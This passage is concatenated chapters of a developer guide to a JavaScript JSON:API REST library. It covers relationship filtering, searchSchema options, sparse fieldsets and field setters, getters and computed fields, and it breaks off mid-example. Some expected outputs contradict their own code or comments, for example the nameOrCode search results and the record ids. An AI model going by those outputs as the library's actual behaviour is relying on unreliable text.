await api.resources.publishers.post({ name: 'French Books Inc.', country: france.id });
await api.resources.publishers.post({ name: 'UK Books Ltd.', country: uk.id });
await api.resources.publishers.post({ name: 'German Press GmbH', country_id: germany.id });
await api.resources.publishers.post({ name: 'Global Publishing', country_id: null });


// Get a publisher, include its country, but only retrieve publisher name and country code
const sparsePublisher = await api.resources.publishers.get({
  id: '1',
  queryParams: {
    include: ['country'],
    fields: {
      publishers: 'name',       // Only name for publishers
      countries: 'code'         // Only code for countries
    }
  }
  // simplified: true is default for programmatic fetches
});
console.log('Sparse Publisher and Country:', inspect(sparsePublisher));


// Query all publishers, include their countries, but only retrieve publisher name and country code
const sparsePublishersQuery = await api.resources.publishers.query({
  queryParams: {
    include: ['country'],
    fields: {
      publishers: 'name',       // Only name for publishers
      countries: 'code,name'    // BOTH code and name for countries
    }
  }
  // simplified: true is default for programmatic fetches
});
// HTTP: GET /api/publishers?include=country&fields[publishers]=name&fields[countries]=code,name
// Returns (simplified): [
//   { id: '1', name: 'French Books Inc.', country: { id: '1', code: 'FR', name: 'France' } },
//   { id: '2', name: 'German Press GmbH', country: { id: '2', code: 'DE', name: 'Germany' } },
//   { id: '3', name: 'UK Books Ltd.', country: { id: '3', code: 'UK', name: 'United Kingdom' } },
//   { id: '4', name: 'Global Publishing', country: null }
// ]
console.log('Sparse Publishers Query (all results):', inspect(sparsePublishersQuery));
```

Note that you can specify multiple fields for countries, and that they need to be comma separated.

**Important Note on Sparse Fieldsets for Related Resources:**
When you specify `fields: { countries: ['code'] }`, this instruction applies to *all* `country` resources present in the API response, whether `country` is the primary resource you are querying directly, or if it's included as a related resource. This ensures consistent data representation across the entire response.

**Expected Output (Sparse Publisher and Country - Illustrative, IDs may vary):**

```text
{
  id: '1',
  name: 'French Books Inc.',
  country_id: '1',
  country: { id: '1', code: 'FR' }
}
Sparse Publishers Query (all results): {
  data: [
    {
      id: '1',
      name: 'French Books Inc.',
      country_id: '1',
      country: { id: '1', code: 'FR', name: 'France' }
    },
    {
      id: '2',
      name: 'UK Books Ltd.',
      country_id: '3',
      country: { id: '3', code: 'UK', name: 'United Kingdom' }
    },
    {
      id: '3',
      name: 'German Press GmbH',
      country_id: '2',
      country: { id: '2', code: 'DE', name: 'Germany' }
    },
    { id: '4', name: 'Global Publishing' }
  ],
  meta: {...},
  links: {...}
}
```

## Filtering by `belongsTo` Relationships

You can filter resources based on conditions applied to their `belongsTo` relationships. This is achieved by defining filterable fields in the `searchSchema` that map to either the foreign key or fields on the related resource.

The `searchSchema` offers a clean way to define filters, abstracting away the underlying database structure and relationship navigation from the client. Clients simply use the filter field names defined in `searchSchema` (e.g., `countryCode` instead of `country.code`).

### Programmatic Usage:

```javascript
// Re-add data for a fresh start (schemas are reused from above)
const france = await api.resources.countries.post({ name: 'France', code: 'FR' });
const germany = await api.resources.countries.post({ name: 'Germany', code: 'DE' });
const uk = await api.resources.countries.post({ name: 'United Kingdom', code: 'UK' });

await api.resources.publishers.post({ name: 'French Books Inc.', country: france.id });
await api.resources.publishers.post({ name: 'UK Books Ltd.', country: uk.id });
await api.resources.publishers.post({ name: 'German Press GmbH', country_id: germany.id });
await api.resources.publishers.post({ name: 'Global Publishing', country_id: null });


// Programmatic search: Find publishers from France using the country ID alias in searchSchema
const publishersFromFrance = await api.resources.publishers.query({
  queryParams: {
    filters: {
      country: france.id // Using 'country' filter field defined in searchSchema
    }
  }
  // simplified: true is default for programmatic fetches
});
// HTTP: GET /api/publishers?filter[country]=1
// Returns: {
//   data: [{ id: '1', name: 'French Books Inc.', country_id: '1' }]
// }

console.log('Publishers from France (by country ID):', inspect(publishersFromFrance));
// Note: publishersFromFrance contains { data, meta, links }
// Note: publishersFromFrance contains { data, meta, links } - access publishersFromFrance.data for the array

// Programmatic search: Find publishers with no associated country
const publishersNoCountry = await api.resources.publishers.query({
  queryParams: {
    filters: {
      country: null // Filtering by null for the 'country' ID filter
    }
  }
  // simplified: true is default for programmatic fetches
});
// HTTP: GET /api/publishers?filter[country]=null
// Returns: {
//   data: [{ id: '4', name: 'Global Publishing', country_id: null }]
// }

console.log('Publishers with No Country (by country ID: null):', inspect(publishersNoCountry));
// Note: publishersNoCountry contains { data, meta, links }

// Programmatic search: Find publishers where the associated country's code is 'UK'
const publishersFromUK = await api.resources.publishers.query({
  queryParams: {
    filters: {
      countryCode: 'UK' // Using 'countryCode' filter field defined in searchSchema
    }
  }
  // simplified: true is default for programmatic fetches
});
// HTTP: GET /api/publishers?filter[countryCode]=UK
// Returns: {
//   data: [{ id: '3', name: 'UK Books Ltd.', country_id: '3' }]
// }

console.log('Publishers from UK (by countryCode):', inspect(publishersFromUK));
```

**Expected Output**

```text
Publishers from France (by country ID): [ { id: '1', name: 'French Books Inc.', country_id: '1' } ]
Publishers with No Country (by country ID: null): [ { id: '4', name: 'Global Publishing' } ]
Publishers from UK (by countryCode): [ { id: '2', name: 'UK Books Ltd.', country_id: '3' } ]
```

---

[Previous: 2.2 Manipulating and searching tables with no relationships](./GUIDE_2_2_Manipulating_And_Searching_Tables.md) | [Back to Guide](./README.md) | [Next: 2.4 hasMany records](./GUIDE_2_4_HasMany_Records.md)# 2.2 Manipulating and searching tables with no relationships

## Setting up the schema

First of all, define a resource with a schema:

```javascript
// Countries table
await api.addResource('countries', {
  schema: {
    name: { type: 'string', required: true, max: 100, search: true },
    code: { type: 'string', max: 2, unique: true, search: true }, // ISO country code
  }
});
await api.resources.countries.createKnexTable()
```

## Adding data

Note that we create the database table at the same time.
This resource has just two fields, name and code, both searchable.

Programmatically you can `post` and `get` easily:

```javascript
const addedFrance = await api.resources.countries.post({ name: 'France', code: 'FR' });
console.log('Added record    :', inspect(addedFrance))

const fetchedFrance = await api.resources.countries.get({ id: addedFrance.id });
console.log('Refetched record:', inspect(fetchedFrance))
```

After the logging messages, you will see:

```text
Added record    : { id: '1', name: 'France', code: 'FR' }
Refetched record: { id: '1', name: 'France', code: 'FR' }
Express server started on port 3000. API available at http://localhost:3000/api
```

You can do the same thing talking to the server directly (although you will be dealing with JSON:API results).
Leaving the code as it is, you will add nother country:


```bash
$ curl -i -X POST -H "Content-Type: application/vnd.api+json" -d '{
  "data": {
    "type": "countries",
    "attributes": {
      "name": "United Kingdom",
      "code": "UK"
    }
  }
}' http://localhost:3000/api/countries
```
```text
HTTP/1.1 204 No Content
X-Powered-By: Express
Location: /api/countries/2
ETag: W/"a-bAsFyilMr4Ra1hIU5PyoyFRunpI"
Date: Wed, 23 Jul 2025 07:54:09 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```
```bash
$ curl -i -X GET http://localhost:3000/api/countries/2
```
```txt
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/vnd.api+json; charset=utf-8
Content-Length: 169
ETag: W/"a9-lnEVXaZ/V6qra0YgjpoEBUTZ3EY"
Date: Wed, 23 Jul 2025 07:54:12 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"data":{"type":"countries","id":"2","attributes":{"name":"United Kingdom","code":"UK"},"links":{"self":"/api/countries/2"}},"links":{"self":"/api/countries/2"}}
```

Note that in "transport" mode after the POST the record was not returned to the client: instead, a status `204 No Content` was returned. However, the client will be aware of the ID of the newly created record thanks to the `Location` header.

## Manipulating data

Replace the data commands with these:

```javascript
await api.addResource('countries', {
  schema: {
    id: { type: 'string' },
    name: { type: 'string', required: true, max: 100, search: true, filterOperator: 'like' },
    code: { type: 'string', max: 2, unique: true, search: true }, // ISO country code
  }
});
await api.resources.countries.createKnexTable()

const fr = await api.resources.countries.post({ name: 'France', code: 'FR' });
const it = await api.resources.countries.post({ name: 'Italyy', code: 'IT' }); // Typo intentional
const de = await api.resources.countries.post({ name: 'Germ', code: 'DE' }); // Typo intentional

// Patching Germany. It will only change the name
await api.resources.countries.patch({id: de.id, name: 'Germany' })
let deFromDb = await api.resources.countries.get({ id: de.id });

// Putting  France. Note that this will actually reset any attributes that were not passed
await api.resources.countries.put({id: it.id, name: 'Italy' })
let itFromDb = await api.resources.countries.get({ id: it.id });

console.log('Patched record (Germany):', inspect(deFromDb))
console.log('Put record: (Italy)', inspect(itFromDb))
```

The result will be:

```text
Patched record (Germany): { id: '3', name: 'Germany', code: 'DE' }
Put record: (Italy) { id: '2', name: 'Italy', code: null }
```

As you can see, using PUT on Italy was a problem: since put didn't include the `code` field, and since PUT assumes a FULL record, the `code` field was reset to null. On the other hand, since the method PATCH assumes a partial update, the update for Germany did not _not_ overwrite the `code` field. This is a very important distinction, and it's the reason why most clients avoid PUT calls.


## Search (Filtering)

The API supports powerful filtering capabilities out of the box for any fields you've marked as `search: true` in your schema.

**Important Note about Query Results in Simplified Mode:**

When using `query()` in simplified mode (the default for programmatic access), the return value is an object containing:
- `data`: The array of matching records
- `meta`: Metadata about the results (e.g., pagination info)
- `links`: Links for pagination and related resources

For example:
```javascript
const result = await api.resources.countries.query({ /* ... */ });
// result is: { data: [...], meta: {...}, links: {...} }
// To access the records: result.data
```

**Programmatic Example: Searching for countries**

Change the code to add some countries:

```javascript
const fr = await api.resources.countries.post({ name: 'France', code: 'FR' });
const it = await api.resources.countries.post({ name: 'Italy', code: 'IT' });
const de = await api.resources.countries.post({ name: 'Germany', code: 'DE' });
const au = await api.resources.countries.post({ name: 'Australia', code: 'AU' });
const at = await api.resources.countries.post({ name: 'Austria', code: 'AT' });
const ge = await api.resources.countries.post({ name: 'Georgia', code: 'GE' });

const searchAustralia = await api.resources.countries.query({
  queryParams: {
    filters: {
      name: 'Australia'
    }
  }
});
// HTTP: GET /api/countries?filter[name]=Australia
// Returns: {
//   data: [{ id: '2', name: 'Australia', code: 'AU' }]
// }

const searchAustr = await api.resources.countries.query({
  queryParams: {
    filters: {
      name: 'Austr'
    }
  }
});
// HTTP: GET /api/countries?filter[name]=Austr
// Returns: {
//   data: []
// }

console.log('Search for "Australia":', inspect(searchAustralia))
console.log('Search for "Austr":', inspect(searchAustr))
// Note: searchAustralia and searchAustr contain { data, meta, links } objects
```

The result will be:

```
Search for Australia: { data: [ { id: '4', name: 'Australia', code: 'AU' } ], meta: {...}, links: {...} }
Search for "Austr": { data: [], meta: {...}, links: {...} }
```

It's clear that the search is only matching precise results.


There are two ways to enable search on a field in your schema. The first one is the one we are currently using, with `search: true`.
As seen above, the only time filtering works is when there is an exact match.
However, rather than `true` or `false`, `search` can also be an object.
Changing the definition of `name` in the `countries` resource to this:

```javascript
    name: { type: 'string', required: true, max: 100, search: { filterOperator: 'like' } },
```

Will give you the expected results:

```text
Search for Australia: [ { id: '4', name: 'Australia', code: 'AU' } ]
Search for "Austr": [
  { id: '4', name: 'Australia', code: 'AU' },
  { id: '5', name: 'Austria', code: 'AT' }
]
```

This is the 

**Available operators for `filterOperator`:**
- `'='` - Exact match (default)
- `'like'` - Partial match with % wildcards automatically added on both sides
- `'>'`, `'>='`, `'<'`, `'<='` - Comparison operators for numeric/date fields
- Other SQL operators are passed through directly (e.g., `'!='`, `'<>'`)

Note: Only `'like'` receives special handling (automatic % wildcards). All other operators are passed directly to the SQL query.

You can also define multiple search patterns from a single field:

```javascript
await api.addResource('countries', {
  schema: {
    name: {
      type: 'string', required: true, search: {
        name: { filterOperator: '=', type: 'string' },
        nameLike: { filterOperator: 'like', type: 'string' }
      }
    },
    code: { type: 'string', unique: true, search: true }
  }
});
await api.resources.countries.createKnexTable()

await api.resources.countries.post({ name: 'Georgia', code: 'GE' });
await api.resources.countries.post({ name: 'France', code: 'FR' });
await api.resources.countries.post({ name: 'Italy', code: 'IT' });
await api.resources.countries.post({ name: 'Germany', code: 'DE' });
await api.resources.countries.post({ name: 'Australia', code: 'AU' });
await api.resources.countries.post({ name: 'Austria', code: 'AT' });

const searchAustralia = await api.resources.countries.query({
  queryParams: {
    filters: {
      name: 'Australia'
    }
  }
});
// HTTP: GET /api/countries?filter[name]=Australia
// Returns: {
//   data: [{ id: '2', name: 'Australia', code: 'AU' }]
// }

const searchAustr = await api.resources.countries.query({
  queryParams: {
    filters: {
      nameLike: 'Austr'
    }
  }
});
// HTTP: GET /api/countries?filter[nameLike]=Austr
// Returns: {
//   data: [{ id: '2', name: 'Australia', code: 'AU' }, { id: '3', name: 'Austria', code: 'AT' }]
// }

console.log('Search for "Australia":', inspect(searchAustralia))
console.log('Search for "Austr":', inspect(searchAustr))
```

This is very powerful in that it allows you to define multiple ways of filtering a field depending on needs.

There is another, even more powerful way to define how to search in a resource: define a whole searchSchema that is completely independent to the main schema.

Under the hood, `rest-api-plugin` actually creates a `searchSchema` object based on the option on the default schema. However, it's very possible for an attribute to define a `searchSchema` directly: 


```javascript
await api.addResource('countries', {
  schema: {
    name: { type: 'string', required: true, max: 100 },
    code: { type: 'string', max: 2, unique: true }
  },
  searchSchema: {
    // Define searchable fields explicitly
    name: { type: 'string', filterOperator: '=' },
    code: { type: 'string', filterOperator: '=' },
    nameLike: { type: 'string', actualField: 'name', filterOperator: 'like' }
  }
});
await api.resources.countries.createKnexTable()
```

Note that the definition above is functionally _identical_ to the one provided a few paragraphs above.

**Important: When you define a `searchSchema`, it completely replaces the search configuration from the main schema.** Only fields defined in the `searchSchema` are searchable if `searchSchema` is defined.

The `searchSchema` gives you:

* complete control and isolation: With searchSchema, you define the search interface completely separately from the data schema. This can be cleaner when you have complex search requirements.
* No mixing of concerns: Your data schema stays focused on data validation and storage, while searchSchema handles search behavior.
* Easier to see all searchable fields at once: Everything is in one place rather than scattered across field definitions.
* Flexibility to completely diverge from the data schema: You might have 20 fields in your schema but only expose 3 for searching, or create 10 search fields from 3 data fields.

`searchSchema` also gives you the ability to define a search field that will search in multiple fields. For example:

```javascript
searchSchema: {
  search: {
    type: 'string',
    oneOf: ['name', 'code'],
    filterOperator: 'like'
  }
}

const searchGe = await api.resources.countries.query({
  queryParams: {
    filters: {
      search: 'ge'
    }
  }
});
// HTTP: GET /api/countries?filter[search]=ge
// Returns: {
//   data: [{ id: '3', name: 'Georgia', code: 'GE' }, { id: '6', name: 'Germany', code: 'DE' }]
// }

console.log('Search for "ge":', inspect(searchGe))
```

Will return:

```
Search for "ge": { data: [
  { id: '3', name: 'Georgia', code: 'GE' },
  { id: '6', name: 'Germany', code: 'DE' }
], meta: {...}, links: {...} }
```

This common pattern will give you the ability to create "global" search fields that will look in multiple fields.

### Multi-word Search with AND Logic

The `oneOf` search feature becomes even more powerful when combined with `splitBy` and `matchAll` options. This allows you to search for multiple words where ALL must appear somewhere in the specified fields.

```javascript
await api.addResource('countries', {
  schema: {
    name: { type: 'string', required: true },
    code: { type: 'string', unique: true }
  },
  searchSchema: {
    search: {
      type: 'string',
      oneOf: ['name', 'code'],
      filterOperator: 'like',
      splitBy: ' ',      // Split search terms by space
      matchAll: true     // Require ALL terms to match (AND logic)
    }
  }
});
await api.resources.countries.createKnexTable()
```

With this configuration, searching becomes much more precise:

```javascript
// Add some countries
await api.resources.countries.post({ name: 'United States', code: 'US' });
await api.resources.countries.post({ name: 'United Kingdom', code: 'UK' });
await api.resources.countries.post({ name: 'United Arab Emirates', code: 'AE' });
await api.resources.countries.post({ name: 'South Africa', code: 'ZA' });

// Search for "united states" - both words must appear
const results = await api.resources.countries.query({
  queryParams: {
    filters: {
      search: 'united states'
    }
  }
});
// HTTP: GET /api/countries?filter[search]=united%20states
// Returns: {
//   data: [{ id: '1', name: 'United States', code: 'US' }]
// }

console.log('Found:', results);
// Note: results contains { data, meta, links } - access results.data for the array
// Note: results now contains { data, meta, links } - access results.data for the array
// Returns: [{ id: '1', name: 'United States', code: 'US' }]
// Does NOT return United Kingdom or United Arab Emirates
```

**How it works:**

1. The search term "united states" is split by space into ["united", "states"]
2. With `matchAll: true`, the query requires BOTH terms to appear
3. Each term can appear in ANY of the fields listed in `oneOf`
4. The SQL generated looks like:

```sql
WHERE (
  (countries.name LIKE '%united%' OR countries.code LIKE '%united%')
  AND
  (countries.name LIKE '%states%' OR countries.code LIKE '%states%')
)
```

**More examples:**

```javascript
// Search for "south africa" - finds only South Africa
const southAfrica = await api.resources.countries.query({
  queryParams: { filters: { search: 'south africa' } }
});
// HTTP: GET /api/countries?filter[search]=south%20africa
// Returns: {
//   data: [{ id: '4', name: 'South Africa', code: 'ZA' }]
// }

// Search for "united arab" - finds only United Arab Emirates
const uae = await api.resources.countries.query({
  queryParams: { filters: { search: 'united arab' } }
});
// HTTP: GET /api/countries?filter[search]=united%20arab
// Returns: {
//   data: [{ id: '3', name: 'United Arab Emirates', code: 'AE' }]
// }

// Single word searches still work normally
const allUnited = await api.resources.countries.query({
  queryParams: { filters: { search: 'united' } }
});
// HTTP: GET /api/countries?filter[search]=united
// Returns: {
//   data: [
//   { id: '1', name: 'United States', code: 'US' },
//   { id: '2', name: 'United Kingdom', code: 'UK' },
//   { id: '3', name: 'United Arab Emirates', code: 'AE' }
// ]
// }
```

**Alternative configurations:**

You can also use different separators and OR logic:

```javascript
searchSchema: {
  // Comma-separated OR search
  tags: {
    type: 'string',
    oneOf: ['tags', 'categories', 'keywords'],
    filterOperator: 'like',
    splitBy: ',',       // Split by comma
    matchAll: false     // OR logic (default) - match ANY term
  },
  
  // Exact match with AND logic
  codes: {
    type: 'string',
    oneOf: ['primary_code', 'secondary_code'],
    filterOperator: '=',   // Exact match
    splitBy: ' ',
    matchAll: true      // All codes must match exactly
  }
}
```

This feature is particularly useful for:
- Full-text search functionality where users type multiple words
- Tag or keyword searches where all terms must be present
- Product searches matching multiple criteria
- Finding records that match complex multi-word queries

### Custom Search Functions

If you need even more complex searches, you can use `searchSchema` to define search fields with custom query logic:

```javascript
await api.addResource('countries', {
  schema: {
    name: { type: 'string', required: true },
    code: { type: 'string', unique: true }
  },
  searchSchema: {
    // Standard fields
    name: { type: 'string', filterOperator: '=' },
    code: { type: 'string', filterOperator: '=' },
    
    // Custom search using a function
    nameOrCode: {
      type: 'string',
      applyFilter: function(query, filterValue) {
        // Custom SQL logic: case-insensitive search in name OR exact match on code
        query.where(function() {
          this.whereRaw('LOWER(name) LIKE LOWER(?)', [`%${filterValue}%`])
              .orWhereRaw('LOWER(code) = LOWER(?)', [filterValue]);
        });
      }
    }
  }
});
await api.resources.countries.createKnexTable()

await api.resources.countries.post({ name: 'United States', code: 'US' });
await api.resources.countries.post({ name: 'United Kingdom', code: 'UK' });
await api.resources.countries.post({ name: 'United Arab Emirates', code: 'AE' });
await api.resources.countries.post({ name: 'South Africa', code: 'ZA' });
```

When `filterOperator` is a function instead of an operator string, it receives:
- `query` - The Knex query builder instance
- `filterValue` - The search value from the user
- `fieldName` - The name of the search field (optional third parameter)

This gives you complete control over the SQL generated for that search field.

**Example usage:**

```javascript
// This custom search will find both:
// - Countries with "at" in the name (United States, United Kingdom, United Arab Emirates)
// - Countries with code "at"
const results = await api.resources.countries.query({
  queryParams: {
    filters: {
      nameOrCode: 'at'
    }
  }
});
// HTTP: GET /api/countries?filter[nameOrCode]=at
// Returns: {
//   data: [
//   { id: '1', name: 'United States', code: 'US' },
//   { id: '2', name: 'United Kingdom', code: 'UK' },
//   { id: '3', name: 'United Arab Emirates', code: 'AE' },
//   { id: '5', name: 'Austria', code: 'AT' }
// ]
// }
```

The result is:

```text
Query results: [
  { id: '1', name: 'United States', code: 'US' },
  { id: '3', name: 'United Arab Emirates', code: 'AE' }
]
```

The function approach is powerful for:
- Case-insensitive searches
- Complex conditions combining multiple fields
- Database-specific functions
- Custom business logic in searches

Since `applyFilter` functions tend to be database-dependent, it's best to avoid using it unless necessary.

### Sparse Fieldsets

The JSON:API specification includes a powerful feature called "sparse fieldsets" that allows you to request only specific fields from a resource. This is essential for optimizing API performance by reducing payload sizes and network traffic.

**How Sparse Fieldsets Work:**

By default, API responses include all fields defined in the schema. With sparse fieldsets, you can specify exactly which fields you want returned. The `id` field is always included automatically as it's required by JSON:API.

Let's work with our countries table:

```javascript
await api.addResource('countries', {
  schema: {
    name: { type: 'string', required: true, max: 100, search: true },
    code: { type: 'string', max: 2, unique: true, search: true }
  }
});
await api.resources.countries.createKnexTable()

// Add some test data
await api.resources.countries.post({ name: 'France', code: 'FR' });
await api.resources.countries.post({ name: 'Germany', code: 'DE' });
await api.resources.countries.post({ name: 'Italy', code: 'IT' });
await api.resources.countries.post({ name: 'United Kingdom', code: 'UK' });
await api.resources.countries.post({ name: 'United States', code: 'US' });
```

**Sparse Fieldsets with `get()` - Single Record:**

```javascript
// Fetch a single country with all fields (default behavior)
const fullCountry = await api.resources.countries.get({ id: '1' });
console.log('Full record:', inspect(fullCountry));

// Fetch only the name field
const nameOnly = await api.resources.countries.get({ 
  id: '1',
  queryParams: { fields: { countries: 'name' } }
});
console.log('Name only:', inspect(nameOnly));

// Fetch only the code field
const codeOnly = await api.resources.countries.get({ 
  id: '1',
  queryParams: { fields: { countries: 'code' } }
});
console.log('Code only:', inspect(codeOnly));
```

The output will be:

```text
Full record: { id: '1', name: 'France', code: 'FR' }
Name only: { id: '1', name: 'France' }
Code only: { id: '1', code: 'FR' }
```

**Sparse Fieldsets with `query()` - Multiple Records:**

Sparse fieldsets become even more valuable when fetching collections, as they can significantly reduce the response size:

```javascript
// Query all countries starting with 'United' - full records
const fullRecords = await api.resources.countries.query({
  queryParams: {
    filters: { name: 'United' }
  }
});
// HTTP: GET /api/countries?filter[name]=United
// Returns: {
//   data: [
//   { id: '4', name: 'United Kingdom', code: 'UK' },
//   { id: '5', name: 'United States', code: 'US' }
// ]
// }

console.log('Full records:', inspect(fullRecords));
// Note: fullRecords contains { data, meta, links }

// Query with only names returned
const namesOnly = await api.resources.countries.query({
  queryParams: {
    filters: { name: 'United' },
    fields: { countries: 'name' }
  }
});
// HTTP: GET /api/countries?filter[name]=United&fields[countries]=name
// Returns: {
//   data: [
//   { id: '4', name: 'United Kingdom' },
//   { id: '5', name: 'United States' }
// ]
// }

console.log('Names only:', inspect(namesOnly));
// Note: namesOnly contains { data, meta, links }

// Query with only codes returned
const codesOnly = await api.resources.countries.query({
  queryParams: {
    filters: { name: 'United' },
    fields: { countries: 'code' }
  }
});
// HTTP: GET /api/countries?filter[name]=United&fields[countries]=code
// Returns: {
//   data: [
//   { id: '4', code: 'UK' },
//   { id: '5', code: 'US' }
// ]
// }

console.log('Codes only:', inspect(codesOnly));
// Note: codesOnly contains { data, meta, links }
```

**Combining Sparse Fieldsets with Complex Searches:**

Sparse fieldsets work seamlessly with all search features, including our new multi-word search:

```javascript
// Define a countries resource with multi-word search
await api.addResource('countries', {
  schema: {
    name: { type: 'string', required: true },
    code: { type: 'string', unique: true },
    population: { type: 'integer' },
    continent: { type: 'string' }
  },
  searchSchema: {
    search: {
      type: 'string',
      oneOf: ['name', 'continent'],
      filterOperator: 'like',
      splitBy: ' ',
      matchAll: true
    }
  }
});

// Add countries with more fields
await api.resources.countries.post({ 
  name: 'South Africa', 
  code: 'ZA', 
  population: 59308690,
  continent: 'Africa'
});
await api.resources.countries.post({ 
  name: 'South Korea', 
  code: 'KR', 
  population: 51269185,
  continent: 'Asia'
});

// Search for "south africa" but return only name and population
const sparseSearch = await api.resources.countries.query({
  queryParams: {
    filters: { search: 'south africa' },
    fields: { countries: 'name,population' }
  }
});
// HTTP: GET /api/countries?filter[search]=south%20africa&fields[countries]=name,population
// Returns: {
//   data: [{ id: '1', name: 'South Africa', population: 59308690 }]
// }

console.log('Sparse search result:', inspect(sparseSearch));
// Note: sparseSearch contains { data, meta, links }
```

**Important Notes:**

1. **The `id` field is always included** - This is required by the JSON:API specification
2. **Field names must match schema** - Requesting non-existent fields will be ignored
3. **Improves performance** - Especially important for large records or when fetching many records
4. **Works with relationships** - When we cover relationships, you'll see how to apply sparse fieldsets to related resources too

**HTTP API Usage:**

When using the HTTP API, sparse fieldsets are specified as comma-separated values:

```
GET /api/countries?fields[countries]=name,code
GET /api/countries/1?fields[countries]=name
GET /api/countries?filter[search]=united+states&fields[countries]=code
```

---

[Previous: 2.1 The starting point](./GUIDE_2_1_The_Starting_Point.md) | [Back to Guide](./README.md) | [Next: 2.3 `belongsTo` Relationships](./GUIDE_2_3_BelongsTo_Relationships.md)# 2.7 Field Transformations

The JSON REST API library provides a comprehensive system for transforming data as it flows through your application. This chapter covers all the ways you can transform, compute, and control field visibility in your API.

## Overview

Field transformations allow you to:
- Accept temporary data that isn't stored (virtual fields)
- Transform data before storing it (setters)
- Transform data when retrieving it (getters)
- Calculate values from other fields (computed fields)
- Control which fields are visible in responses (hidden fields)

## The Data Transformation Pipeline

Understanding when each transformation occurs is crucial for building robust APIs:

```
INPUT FLOW (POST/PUT/PATCH):
┌─────────────┐     ┌──────────────────┐     ┌─────────┐     ┌──────────┐
│ User Input  │ --> │ Validate Schema  │ --> │ Setters │ --> │ Database │
│   (JSON)    │     │ (including virt) │     │         │     │ (no virt)│
└─────────────┘     └──────────────────┘     └─────────┘     └──────────┘
                              ↓
                    Virtual fields validated
                    and preserved for response

OUTPUT FLOW (GET):
┌──────────┐     ┌─────────┐     ┌──────────────┐     ┌─────────────────┐     ┌──────────┐
│ Database │ --> │ Getters │ --> │   Computed   │ --> │ Merge Virtual & │ --> │ Response │
│          │     │         │     │    Fields    │     │ Apply Hidden    │     │  (JSON)  │
└──────────┘     └─────────┘     └──────────────┘     └─────────────────┘     └──────────┘
```

## Virtual Fields

Virtual fields are fields that pass through the API but are never stored in the database. They're perfect for temporary data needed during request processing.

### Defining Virtual Fields

```javascript
await api.addResource('users', {
  schema: {
    username: { type: 'string', required: true },
    email: { type: 'string', required: true },
    password: { type: 'string', required: true, hidden: true },
    
    // Virtual fields - not stored in database
    passwordConfirmation: { type: 'string', virtual: true },
    termsAccepted: { type: 'boolean', virtual: true },
    captchaToken: { type: 'string', virtual: true }
  }
});
```

### Common Use Cases

1. **Password Confirmation**
   ```javascript
   // Client sends:
   {
     "username": "john",
     "password": "secret123",
     "passwordConfirmation": "secret123"  // Virtual field
   }
   
   // Use in a hook to validate:
   api.on('beforeData:create:users', ({ inputRecord }) => {
     const { password, passwordConfirmation } = inputRecord.data.attributes;
     if (password !== passwordConfirmation) {
       throw new Error('Passwords do not match');
     }
   });
   ```

2. **Terms Acceptance**
   ```javascript
   api.on('beforeData:create:users', ({ inputRecord }) => {
     if (!inputRecord.data.attributes.termsAccepted) {
       throw new Error('You must accept the terms of service');
     }
   });
   ```

3. **UI State or Metadata**
   ```javascript
   // Client can send UI state that's returned but not stored
   {
     "title": "My Article",
     "content": "...",
     "editorState": { ... },  // Virtual field with editor metadata
     "isDraft": true          // Virtual field for UI state
   }
   ```

### Key Characteristics

- **Input**: Accepted in POST/PUT/PATCH requests
- **Validation**: Validated according to schema rules
- **Storage**: Never stored in the database
- **Output**: Returned in responses if provided
- **Hooks**: Available to all hooks during request processing

## Setters and Getters

Setters and getters transform data at the database boundary. Setters run before saving, getters run after loading.

### Setters - Transform Before Storage

```javascript
await api.addResource('users', {
  schema: {
    email: { 
      type: 'string', 
      required: true,
      setter: (value) => value.toLowerCase().trim()
    },
    phone: {
      type: 'string',
      setter: (value) => {
        // Remove all non-digits
        return value ? value.replace(/\D/g, '') : null;
      }
    },
    metadata: {
      type: 'object',
      setter: (value) => JSON.stringify(value || {})
    }
  }
});
```

### Getters - Transform After Retrieval

```javascript
await api.addResource('users', {
  schema: {
    email: { 
      type: 'string',
      getter: (value) => value?.toLowerCase()
    },
    phone: {
      type: 'string',
      getter: (value) => {
        // Format as (XXX) XXX-XXXX
        if (!value || value.length !== 10) return value;
        return `(${value.slice(0,3)}) ${value.slice(3,6)}-${value.slice(6)}`;
      }
    },
    metadata: {
      type: 'string',
      getter: (value) => {
        try {
          return value ? JSON.parse(value) : {};
        } catch {
          return {};
        }
      }
    }
  }
});
```

### Using Virtual Fields with Setters

A common pattern is using virtual fields to provide data that setters will process:

```javascript
await api.addResource('products', {
  schema: {
    price: { 
      type: 'number',
      setter: function(value, { attributes }) {
        // Use virtual priceInCents if provided
        if (attributes.priceInCents !== undefined) {
          return attributes.priceInCents / 100;
        }
        return value;
      }
    },
    priceInCents: { type: 'number', virtual: true }
  }
});

// Client can send either format:
// { "price": 19.99 } 
// OR
// { "priceInCents": 1999 }
```

### Async Setters and Getters

Both setters and getters can be async:

```javascript
await api.addResource('secure_data', {
  schema: {
    secret: {
      type: 'string',
      setter: async (value) => {
        // Encrypt before storing
        const encrypted = await encrypt(value);
        return encrypted;
      },
      getter: async (value) => {
        // Decrypt after retrieving
        const decrypted = await decrypt(value);
        return decrypted;
      }
    }
  }
});
```

### Setter and Getter Context

Both functions receive a context object as the second parameter:

```javascript
setter: (value, context) => {
  // context contains:
  // - attributes: all field values
  // - record: the full record (on updates)
  // - scopeName: resource name
  // - method: 'post', 'put', or 'patch'
  
  if (context.method === 'post') {
    // Special handling for creation
  }
  return value;
}
```

## Computed Fields

Computed fields are output-only fields calculated from other fields. They're never stored and always calculated fresh when requested.

### Basic Computed Fields

```javascript
await api.addResource('products', {
  schema: {
    name: { type: 'string', required: true },
    price: { type: 'number', required: true },
    cost: { type: 'number', required: true, normallyHidden: true },
    
    // Computed fields
    profitMargin: {
      type: 'number',
      computed: true,
      dependencies: ['price', 'cost'],
      compute: ({ attributes }) => {
        if (!attributes.price || !attributes.cost) return null;
        return ((attributes.price - attributes.cost) / attributes.price * 100).toFixed(2);
      }
    },
    
    displayName: {
      type: 'string',
      computed: true,
      dependencies: ['name', 'price'],
      compute: ({ attributes }) => {
        return `${attributes.name} - $${attributes.price}`;
      }
    }
  }
});
```

### Dependencies and Hidden Fields

Computed fields can depend on hidden fields:

```javascript
await api.addResource('users', {
  schema: {
    firstName: { type: 'string' },
    lastName: { type: 'string' },
    dateOfBirth: { type: 'date', normallyHidden: true },
    
    fullName: {
      type: 'string',
      computed: true,
      dependencies: ['firstName', 'lastName'],
      compute: ({ attributes }) => {
